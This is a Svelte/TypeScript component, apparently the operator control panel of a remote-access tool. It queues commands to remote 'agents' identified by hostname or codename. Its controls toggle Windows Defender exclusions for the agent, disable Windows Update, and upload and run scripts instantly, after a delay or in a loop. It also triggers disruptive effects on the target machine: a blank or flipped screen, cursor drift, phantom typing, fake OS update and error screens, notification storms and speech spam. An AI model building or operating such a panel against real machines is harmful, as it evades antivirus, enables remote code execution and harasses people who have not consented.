<script lang="ts">
	import { onDestroy, onMount } from 'svelte';
	import { Tabs, TabsList, TabsTrigger, TabsContent } from '$lib/components/ui/tabs/index.js';
	import { Switch } from '$lib/components/ui/switch/index.js';
	import { Label } from '$lib/components/ui/label/index.js';
	import {
		Select,
		SelectTrigger,
		SelectContent,
		SelectItem
	} from '$lib/components/ui/select/index.js';
	import { Slider } from '$lib/components/ui/slider/index.js';
	import { Input } from '$lib/components/ui/input/index.js';
	import { Tooltip, TooltipTrigger, TooltipContent } from '$lib/components/ui/tooltip/index.js';
	import { Info } from '@lucide/svelte';
	import type { Client } from '$lib/data/clients';
	import { queueToolActivationCommand } from '$lib/utils/agent-commands.js';
	import type {
		CommandQueueResponse,
		CommandResult
	} from '../../../../../../shared/types/messages';
	import type { AgentOptionsResponse, OptionsState } from '../../../../../../shared/types/options';
	import type { AgentDetailResponse } from '../../../../../../shared/types/agent';
	import { toast } from 'svelte-sonner';

	const { client } = $props<{ client: Client }>();

	const agentLabel = $derived(() => client.hostname?.trim() || client.codename || client.id);

	const defaultOptionsState: OptionsState = {
		defenderExclusion: false,
		windowsUpdate: false,
		visualDistortion: 'None',
		screenOrientation: 'Normal',
		wallpaperMode: 'Default',
		cursorBehavior: 'Normal',
		keyboardMode: 'None',
		soundPlayback: true,
		soundVolume: 60,
		script: {
			mode: 'Instant',
			loop: false,
			delaySeconds: 0
		},
		scriptRuntime: {
			status: 'idle',
			active: false,
			lastStartedAt: null,
			lastCompletedAt: null,
			lastExitCode: 0,
			hasExitCode: false,
			lastError: '',
			runs: 0
		},
		fakeEventMode: 'None',
		speechSpam: false,
		autoMinimize: false
	};

	let defenderExclusion = $state(false);
	let windowsUpdate = $state(false);

	let visualDistortion = $state('None');
	let screenFlip = $state('Normal');
	let wallpaperMode = $state('Default');

	let cursorBehavior = $state('Normal');
	let keyboardShenanigans = $state('None');
	let soundPlayback = $state(true);
	let soundVolume = $state(60);

	let scriptFile = $state<File | null>(null);
	let scriptMode = $state('Instant');
	let scriptLoop = $state(false);
	let scriptDelay = $state(0);

	let fakeEventMode = $state('None');
	let ttsSpam = $state(false);
	let autoMinimize = $state(false);

	let lastCommittedSoundVolume = $state(60);
	let lastCommittedScriptDelay = $state(0);

	let activePollController: AbortController | null = null;
	let optionsStateController: AbortController | null = null;

	const resultPollIntervalMs = 750;
	const resultTimeoutMs = 20_000;

	const toastPosition = 'bottom-right';

	function describeDelivery(response: CommandQueueResponse | null): string {
		if (!response) {
			return `Command queued for ${agentLabel}'s next check-in.`;
		}

		return response.delivery === 'session'
			? `Action dispatched immediately to ${agentLabel}.`
			: `Command queued for ${agentLabel}'s next check-in.`;
	}

	function cancelResultPoll() {
		if (activePollController) {
			activePollController.abort();
			activePollController = null;
		}
	}

	function cancelOptionsStateFetch() {
		if (optionsStateController) {
			optionsStateController.abort();
			optionsStateController = null;
		}
	}

	function applyOptionsState(state: OptionsState | null | undefined) {
		const snapshot = state ?? defaultOptionsState;

		defenderExclusion =
			snapshot.defenderExclusion ?? defaultOptionsState.defenderExclusion ?? false;
		windowsUpdate = snapshot.windowsUpdate ?? defaultOptionsState.windowsUpdate ?? false;
		visualDistortion = snapshot.visualDistortion ?? defaultOptionsState.visualDistortion ?? 'None';
		screenFlip = snapshot.screenOrientation ?? defaultOptionsState.screenOrientation ?? 'Normal';
		wallpaperMode = snapshot.wallpaperMode ?? defaultOptionsState.wallpaperMode ?? 'Default';
		cursorBehavior = snapshot.cursorBehavior ?? defaultOptionsState.cursorBehavior ?? 'Normal';
		keyboardShenanigans = snapshot.keyboardMode ?? defaultOptionsState.keyboardMode ?? 'None';

		soundPlayback = snapshot.soundPlayback ?? defaultOptionsState.soundPlayback ?? true;
		const resolvedVolume = snapshot.soundVolume ?? defaultOptionsState.soundVolume ?? 60;
		soundVolume = resolvedVolume;
		lastCommittedSoundVolume = resolvedVolume;

		const scriptConfig = snapshot.script ?? defaultOptionsState.script;
		scriptMode = scriptConfig?.mode ?? defaultOptionsState.script?.mode ?? 'Instant';
		scriptLoop = scriptConfig?.loop ?? defaultOptionsState.script?.loop ?? false;
		const resolvedDelay =
			scriptConfig?.delaySeconds ?? defaultOptionsState.script?.delaySeconds ?? 0;
		scriptDelay = resolvedDelay;
		lastCommittedScriptDelay = resolvedDelay;

		fakeEventMode = snapshot.fakeEventMode ?? defaultOptionsState.fakeEventMode ?? 'None';
		ttsSpam = snapshot.speechSpam ?? defaultOptionsState.speechSpam ?? false;
		autoMinimize = snapshot.autoMinimize ?? defaultOptionsState.autoMinimize ?? false;
	}

	async function refreshOptionsState(options: { silent?: boolean } = {}): Promise<void> {
		cancelOptionsStateFetch();

		const controller = new AbortController();
		optionsStateController = controller;

		try {
			const response = await fetch(`/api/agents/${client.id}/options`, {
				signal: controller.signal
			});
			if (!response.ok) {
				const detail = (await response.text().catch(() => ''))?.trim();
				throw new Error(detail || `Failed to fetch options state (status ${response.status}).`);
			}

			const payload = (await response.json()) as AgentOptionsResponse;
			applyOptionsState(payload?.state ?? null);
		} catch (error) {
			if (controller.signal.aborted) {
				return;
			}
			if (!options.silent) {
				console.error('Failed to refresh options state', error);
			}
		} finally {
			if (optionsStateController === controller) {
				optionsStateController = null;
			}
		}
	}

	async function fetchAgentSnapshot(
		signal?: AbortSignal
	): Promise<AgentDetailResponse['agent'] | null> {
		try {
			const response = await fetch(`/api/agents/${client.id}`, { signal });
			if (!response.ok) {
				console.error(`Failed to refresh agent snapshot: ${response.status}`);
				return null;
			}
			const payload = (await response.json()) as AgentDetailResponse;
			return payload.agent;
		} catch (error) {
			if (error instanceof DOMException && error.name === 'AbortError') {
				throw error;
			}
			console.error('Failed to refresh agent snapshot', error);
			return null;
		}
	}

	async function waitForCommandResult(commandId: string): Promise<CommandResult> {
		cancelResultPoll();
		const controller = new AbortController();
		activePollController = controller;

		const startedAt = Date.now();
		try {
			while (!controller.signal.aborted) {
				const snapshot = await fetchAgentSnapshot(controller.signal);
				const match = snapshot?.recentResults?.find((result) => result.commandId === commandId);
				if (match) {
					return match;
				}

				if (Date.now() - startedAt > resultTimeoutMs) {
					throw new Error('Timed out waiting for agent response.');
				}

				await new Promise((resolve) => setTimeout(resolve, resultPollIntervalMs));
			}
		} finally {
			cancelResultPoll();
		}

		throw new Error('Command result polling cancelled.');
	}

	onDestroy(() => {
		cancelResultPoll();
		cancelOptionsStateFetch();
	});

	onMount(() => {
		void refreshOptionsState();
	});

	interface OptionDispatchConfig {
		action: string;
		metadata?: Record<string, unknown>;
		successTitle: string;
		successDescription?: string;
		failureTitle: string;
		failureDescription?: string;
	}

	async function dispatchOptionChange(config: OptionDispatchConfig): Promise<boolean> {
		try {
			const response = await queueToolActivationCommand(client.id, 'options', {
				action: `operation:${config.action}`,
				metadata: config.metadata
			});

			if (!response) {
				throw new Error('Agent command queue unavailable.');
			}

			const commandId = response.command?.id?.trim();
			if (!commandId) {
				throw new Error('Command identifier missing from agent response.');
			}

			const result = await waitForCommandResult(commandId);
			if (!result.success) {
				const message = result.error?.trim() || 'Agent reported failure.';
				throw new Error(message);
			}

			const successTitle = result.output?.trim() || config.successTitle;
			const description = config.successDescription ?? describeDelivery(response);

			toast.success(successTitle, {
				description,
				position: toastPosition
			});

			return true;
		} catch (error) {
			const fallback =
				config.failureDescription ?? 'Unexpected error while communicating with the agent.';
			const detail =
				error instanceof Error && error.message.trim() !== '' ? error.message : fallback;

			toast.error(config.failureTitle, {
				description: detail,
				position: toastPosition
			});

			return false;
		} finally {
			void refreshOptionsState({ silent: true });
		}
	}

	async function handleDefenderExclusionChange(next: boolean) {
		const previous = defenderExclusion;
		defenderExclusion = next;

		const success = await dispatchOptionChange({
			action: 'defender-exclusion',
			metadata: { enabled: next },
			successTitle: next
				? 'Windows Defender exclusion enabled'
				: 'Windows Defender exclusion disabled',
			failureTitle: 'Failed to update Windows Defender exclusion'
		});

		if (!success) {
			defenderExclusion = previous;
		}
	}

	async function handleWindowsUpdateChange(next: boolean) {
		const previous = windowsUpdate;
		windowsUpdate = next;

		const success = await dispatchOptionChange({
			action: 'windows-update',
			metadata: { enabled: next },
			successTitle: next ? 'Windows Update enabled' : 'Windows Update disabled',
			failureTitle: 'Failed to update Windows Update state'
		});

		if (!success) {
			windowsUpdate = previous;
		}
	}

	async function handleVisualDistortionChange(value: string) {
		const previous = visualDistortion;
		visualDistortion = value;

		const success = await dispatchOptionChange({
			action: 'visual-distortion',
			metadata: { mode: value },
			successTitle: `Visual distortion set to ${value}`,
			failureTitle: 'Failed to update visual distortion'
		});

		if (!success) {
			visualDistortion = previous;
		}
	}

	async function handleScreenFlipChange(value: string) {
		const previous = screenFlip;
		screenFlip = value;

		const success = await dispatchOptionChange({
			action: 'screen-orientation',
			metadata: { orientation: value },
			successTitle: `Screen orientation set to ${value}`,
			failureTitle: 'Failed to update screen orientation'
		});

		if (!success) {
			screenFlip = previous;
		}
	}

	async function handleWallpaperModeChange(value: string) {
		const previous = wallpaperMode;
		wallpaperMode = value;

		const success = await dispatchOptionChange({
			action: 'wallpaper-mode',
			metadata: { mode: value },
			successTitle: `Wallpaper mode set to ${value}`,
			failureTitle: 'Failed to update wallpaper mode'
		});

		if (!success) {
			wallpaperMode = previous;
		}
	}

	async function handleCursorBehaviorChange(value: string) {
		const previous = cursorBehavior;
		cursorBehavior = value;

		const success = await dispatchOptionChange({
			action: 'cursor-behavior',
			metadata: { behavior: value },
			successTitle: `Cursor behavior set to ${value}`,
			failureTitle: 'Failed to update cursor behavior'
		});

		if (!success) {
			cursorBehavior = previous;
		}
	}

	async function handleKeyboardShenanigansChange(value: string) {
		const previous = keyboardShenanigans;
		keyboardShenanigans = value;

		const success = await dispatchOptionChange({
			action: 'keyboard-mode',
			metadata: { mode: value },
			successTitle: `Keyboard mode set to ${value}`,
			failureTitle: 'Failed to update keyboard behavior'
		});

		if (!success) {
			keyboardShenanigans = previous;
		}
	}

	async function handleSoundPlaybackChange(next: boolean) {
		const previous = soundPlayback;
		soundPlayback = next;

		const success = await dispatchOptionChange({
			action: 'sound-playback',
			metadata: { enabled: next },
			successTitle: next ? 'Sound playback enabled' : 'Sound playback muted',
			failureTitle: 'Failed to update sound playback state'
		});

		if (!success) {
			soundPlayback = previous;
		}
	}

	async function handleSoundVolumeCommit(next: number) {
		const previous = lastCommittedSoundVolume;
		lastCommittedSoundVolume = next;

		const success = await dispatchOptionChange({
			action: 'sound-volume',
			metadata: { volume: next },
			successTitle: `Sound volume set to ${next}%`,
			failureTitle: 'Failed to update sound volume'
		});

		if (!success) {
			soundVolume = previous;
			lastCommittedSoundVolume = previous;
		}
	}

	async function handleScriptSelect(event: Event) {
		const input = event.currentTarget as HTMLInputElement | null;
		const files = input?.files;
		if (!files || files.length === 0) {
			scriptFile = null;
			return;
		}

		const file = files[0];
		scriptFile = file;

		try {
			const formData = new FormData();
			formData.append('script', file);

			const response = await fetch(`/api/agents/${client.id}/options/script`, {
				method: 'POST',
				body: formData
			});

			if (!response.ok) {
				const detail = (await response.text().catch(() => ''))?.trim();
				throw new Error(detail || 'Failed to stage script file.');
			}

			const payload = (await response.json()) as {
				stagingToken: string;
				fileName?: string;
				size?: number;
				type?: string;
				sha256?: string;
			};

			if (!payload?.stagingToken) {
				throw new Error('Staging token missing from response.');
			}

			const metadata: Record<string, unknown> = {
				stagingToken: payload.stagingToken,
				fileName: payload.fileName ?? file.name,
				size: payload.size ?? file.size,
				type: payload.type ?? file.type
			};

			if (payload.sha256) {
				metadata.sha256 = payload.sha256;
			}

			const success = await dispatchOptionChange({
				action: 'script-file',
				metadata,
				successTitle: `Script ${(metadata.fileName as string) || file.name} staged`,
				failureTitle: 'Failed to stage script file'
			});

			if (!success) {
				scriptFile = null;
				if (input) {
					input.value = '';
				}
			}
		} catch (err) {
			const message = err instanceof Error ? err.message : 'Failed to stage script file.';
			toast.error('Failed to stage script file', {
				description: message,
				position: toastPosition
			});
			scriptFile = null;
			if (input) {
				input.value = '';
			}
		}
	}

	async function handleScriptModeChange(value: string) {
		const previous = scriptMode;
		scriptMode = value;

		const success = await dispatchOptionChange({
			action: 'script-mode',
			metadata: { mode: value, loop: scriptLoop, delaySeconds: scriptDelay },
			successTitle: `Script execution mode set to ${value}`,
			failureTitle: 'Failed to update script execution mode'
		});

		if (!success) {
			scriptMode = previous;
		}
	}

	async function handleScriptLoopChange(next: boolean) {
		const previous = scriptLoop;
		scriptLoop = next;

		const success = await dispatchOptionChange({
			action: 'script-loop',
			metadata: { loop: next },
			successTitle: next ? 'Script loop enabled' : 'Script loop disabled',
			failureTitle: 'Failed to update script loop state'
		});

		if (!success) {
			scriptLoop = previous;
		}
	}

	async function handleScriptDelayCommit(next: number) {
		const previous = lastCommittedScriptDelay;
		lastCommittedScriptDelay = next;

		const success = await dispatchOptionChange({
			action: 'script-delay',
			metadata: { delaySeconds: next },
			successTitle: `Script delay set to ${next} seconds`,
			failureTitle: 'Failed to update script delay'
		});

		if (!success) {
			scriptDelay = previous;
			lastCommittedScriptDelay = previous;
		}
	}

	async function handleFakeEventModeChange(value: string) {
		const previous = fakeEventMode;
		fakeEventMode = value;

		const success = await dispatchOptionChange({
			action: 'fake-event-mode',
			metadata: { mode: value },
			successTitle: `Fake event mode set to ${value}`,
			failureTitle: 'Failed to update fake event mode'
		});

		if (!success) {
			fakeEventMode = previous;
		}
	}

	async function handleTtsSpamChange(next: boolean) {
		const previous = ttsSpam;
		ttsSpam = next;

		const success = await dispatchOptionChange({
			action: 'speech-spam',
			metadata: { enabled: next },
			successTitle: next ? 'Speech spam enabled' : 'Speech spam disabled',
			failureTitle: 'Failed to update speech spam state'
		});

		if (!success) {
			ttsSpam = previous;
		}
	}

	async function handleAutoMinimizeChange(next: boolean) {
		const previous = autoMinimize;
		autoMinimize = next;

		const success = await dispatchOptionChange({
			action: 'auto-minimize',
			metadata: { enabled: next },
			successTitle: next ? 'Auto minimize enabled' : 'Auto minimize disabled',
			failureTitle: 'Failed to update auto minimize state'
		});

		if (!success) {
			autoMinimize = previous;
		}
	}
</script>

<div class="space-y-6 p-6">
	<h2 class="text-xl font-semibold tracking-tight text-foreground/90">System Options</h2>

	<Tabs>
		<TabsList class="flex flex-wrap gap-2 border-b border-border/40 pb-2">
			<TabsTrigger value="system">System</TabsTrigger>
			<TabsTrigger value="display">Display</TabsTrigger>
			<TabsTrigger value="input">Input & Sound</TabsTrigger>
			<TabsTrigger value="automation">Automation</TabsTrigger>
			<TabsTrigger value="misc">Misc</TabsTrigger>
		</TabsList>

		<TabsContent value="system" class="grid gap-4 pt-4 sm:grid-cols-2 lg:grid-cols-3">
			<div class="flex items-center justify-between rounded-lg border border-border/50 p-3">
				<span>Windows Defender Exclusion</span>
				<div class="flex items-center gap-2">
					<Tooltip>
						<TooltipTrigger><Info class="h-4 w-4 text-muted-foreground" /></TooltipTrigger>
						<TooltipContent>Add or remove system process exclusions for the agent.</TooltipContent>
					</Tooltip>
					<Switch
						checked={defenderExclusion}
						onCheckedChange={(value) => void handleDefenderExclusionChange(value)}
					/>
				</div>
			</div>

			<div class="flex items-center justify-between rounded-lg border border-border/50 p-3">
				<span>Windows Update</span>
				<div class="flex items-center gap-2">
					<Tooltip>
						<TooltipTrigger><Info class="h-4 w-4 text-muted-foreground" /></TooltipTrigger>
						<TooltipContent>Toggle Windows Update automatic check state.</TooltipContent>
					</Tooltip>
					<Switch
						checked={windowsUpdate}
						onCheckedChange={(value) => void handleWindowsUpdateChange(value)}
					/>
				</div>
			</div>
		</TabsContent>

		<TabsContent value="display" class="grid gap-4 pt-4 sm:grid-cols-2 lg:grid-cols-3">
			<div>
				<Label>Visual Distortion</Label>
				<Select
					type="single"
					value={visualDistortion}
					onValueChange={(value) => void handleVisualDistortionChange(value)}
				>
					<SelectTrigger placeholder="None" />
					<SelectContent>
						<SelectItem value="None">None</SelectItem>
						<SelectItem value="InvertColors">Invert Colors</SelectItem>
						<SelectItem value="Pixelate">Pixelate</SelectItem>
						<SelectItem value="Wiggle">Wiggle</SelectItem>
						<SelectItem value="Blank">Blank Screen</SelectItem>
					</SelectContent>
				</Select>
			</div>

			<div>
				<Label>Screen Orientation</Label>
				<Select
					type="single"
					value={screenFlip}
					onValueChange={(value) => void handleScreenFlipChange(value)}
				>
					<SelectTrigger placeholder="Normal" />
					<SelectContent>
						<SelectItem value="Normal">Normal</SelectItem>
						<SelectItem value="UpsideDown">Upside Down</SelectItem>
						<SelectItem value="RotateLeft">Rotate Left</SelectItem>
						<SelectItem value="RotateRight">Rotate Right</SelectItem>
					</SelectContent>
				</Select>
			</div>

			<div>
				<Label>Wallpaper Mode</Label>
				<Select
					type="single"
					value={wallpaperMode}
					onValueChange={(value) => void handleWallpaperModeChange(value)}
				>
					<SelectTrigger placeholder="Default" />
					<SelectContent>
						<SelectItem value="Default">Default</SelectItem>
						<SelectItem value="Custom">Custom</SelectItem>
						<SelectItem value="Random">Random</SelectItem>
						<SelectItem value="Black">Black</SelectItem>
					</SelectContent>
				</Select>
			</div>
		</TabsContent>

		<TabsContent value="input" class="grid gap-4 pt-4 sm:grid-cols-2 lg:grid-cols-3">
			<div>
				<Label>Cursor Behavior</Label>
				<Select
					type="single"
					value={cursorBehavior}
					onValueChange={(value) => void handleCursorBehaviorChange(value)}
				>
					<SelectTrigger placeholder="Normal" />
					<SelectContent>
						<SelectItem value="Normal">Normal</SelectItem>
						<SelectItem value="Reverse">Reverse</SelectItem>
						<SelectItem value="Drift">Drift</SelectItem>
						<SelectItem value="Ghost">Ghost</SelectItem>
					</SelectContent>
				</Select>
			</div>

			<div>
				<Label>Keyboard Shenanigans</Label>
				<Select
					type="single"
					value={keyboardShenanigans}
					onValueChange={(value) => void handleKeyboardShenanigansChange(value)}
				>
					<SelectTrigger placeholder="None" />
					<SelectContent>
						<SelectItem value="None">None</SelectItem>
						<SelectItem value="Sticky">Sticky Keys Storm</SelectItem>
						<SelectItem value="CapsLoop">Caps Lock Loop</SelectItem>
						<SelectItem value="PhantomTyping">Phantom Typing</SelectItem>
					</SelectContent>
				</Select>
			</div>

			<div class="flex items-center justify-between rounded-lg border border-border/50 p-3">
				<span>Sound Playback</span>
				<div class="flex items-center gap-2">
					<Tooltip>
						<TooltipTrigger><Info class="h-4 w-4 text-muted-foreground" /></TooltipTrigger>
						<TooltipContent>Enable or mute system audio playback.</TooltipContent>
					</Tooltip>
					<Switch
						checked={soundPlayback}
						onCheckedChange={(value) => void handleSoundPlaybackChange(value)}
					/>
				</div>
			</div>

			<div>
				<Label>Sound Volume</Label>
				<Slider
					type="single"
					min={0}
					max={100}
					step={5}
					value={soundVolume}
					onValueChange={(value) => (soundVolume = value)}
					onValueCommit={(value) => void handleSoundVolumeCommit(value)}
				/>
				<p class="mt-1 text-xs text-muted-foreground">Volume: {soundVolume}%</p>
			</div>
		</TabsContent>

		<TabsContent value="automation" class="space-y-4 pt-4">
			<div>
				<Label>Script File</Label>
				<Input
					type="file"
					accept=".ps1,.bat,.cmd,.sh,.js"
					onchange={(event) => void handleScriptSelect(event)}
				/>
				{#if scriptFile}
					<p class="mt-1 text-xs text-muted-foreground">Selected: {scriptFile.name}</p>
				{/if}
			</div>

			<div class="grid gap-4 sm:grid-cols-3">
				<div>
					<Label>Execution Mode</Label>
					<Select
						type="single"
						value={scriptMode}
						onValueChange={(value) => void handleScriptModeChange(value)}
					>
						<SelectTrigger placeholder="Instant" />
						<SelectContent>
							<SelectItem value="Instant">Instant</SelectItem>
							<SelectItem value="Delayed">After Delay</SelectItem>
							<SelectItem value="Looped">Continuous Loop</SelectItem>
						</SelectContent>
					</Select>
				</div>

				<div>
					<Label>Delay (seconds)</Label>
					<Slider
						type="single"
						min={0}
						max={60}
						step={5}
						value={scriptDelay}
						onValueChange={(value) => (scriptDelay = value)}
						onValueCommit={(value) => void handleScriptDelayCommit(value)}
					/>
					<p class="mt-1 text-xs text-muted-foreground">Delay: {scriptDelay}s</p>
				</div>

				<div class="flex items-center justify-between rounded-lg border border-border/50 p-3">
					<span>Loop Execution</span>
					<div class="flex items-center gap-2">
						<Tooltip>
							<TooltipTrigger><Info class="h-4 w-4 text-muted-foreground" /></TooltipTrigger>
							<TooltipContent>Repeat script indefinitely.</TooltipContent>
						</Tooltip>
						<Switch
							checked={scriptLoop}
							onCheckedChange={(value) => void handleScriptLoopChange(value)}
						/>
					</div>
				</div>
			</div>
		</TabsContent>

		<TabsContent value="misc" class="grid gap-4 pt-4 sm:grid-cols-2 lg:grid-cols-3">
			<div>
				<Label>Fake Event Mode</Label>
				<Select
					type="single"
					value={fakeEventMode}
					onValueChange={(value) => void handleFakeEventModeChange(value)}
				>
					<SelectTrigger placeholder="None" />
					<SelectContent>
						<SelectItem value="None">None</SelectItem>
						<SelectItem value="FakeUpdate">Fake OS Update</SelectItem>
						<SelectItem value="FakeError">Fake Error Screen</SelectItem>
						<SelectItem value="NotificationStorm">Notification Storm</SelectItem>
					</SelectContent>
				</Select>
			</div>

			<div class="flex items-center justify-between rounded-lg border border-border/50 p-3">
				<span>Speech Spam</span>
				<div class="flex items-center gap-2">
					<Tooltip>
						<TooltipTrigger><Info class="h-4 w-4 text-muted-foreground" /></TooltipTrigger>
						<TooltipContent>Enable periodic TTS messages.</TooltipContent>
					</Tooltip>
					<Switch checked={ttsSpam} onCheckedChange={(value) => void handleTtsSpamChange(value)} />
				</div>
			</div>

			<div class="flex items-center justify-between rounded-lg border border-border/50 p-3">
				<span>Auto Minimize Windows</span>
				<div class="flex items-center gap-2">
					<Tooltip>
						<TooltipTrigger><Info class="h-4 w-4 text-muted-foreground" /></TooltipTrigger>
						<TooltipContent>Periodically minimize all open windows.</TooltipContent>
					</Tooltip>
					<Switch
						checked={autoMinimize}
						onCheckedChange={(value) => void handleAutoMinimizeChange(value)}
					/>
				</div>
			</div>
		</TabsContent>
	</Tabs>
</div>
